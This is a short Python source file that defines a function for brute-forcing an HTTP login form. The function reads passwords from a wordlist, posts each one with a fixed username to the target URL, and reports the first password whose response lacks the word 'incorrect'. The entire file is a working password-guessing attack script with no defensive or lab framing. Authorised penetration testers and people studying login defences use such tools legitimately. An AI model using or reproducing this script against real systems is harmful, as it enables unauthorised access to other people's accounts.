import requests

def http_brute_force(url, username, wordlist_path):
    print(f"[INFO] Starting brute force on {url} with username '{username}'")
    with open(wordlist_path, "r") as f:
        passwords = f.read().splitlines()

    for password in passwords:
        response = requests.post(url, data={"username": username, "password": password})
        if "incorrect" not in response.text.lower():
            print(f"[SUCCESS] Password found: {password}")
            return
        else:
            print(f"[FAILED] Tried password: {password}")
    print("[!] Brute-force failed. No valid password found.")
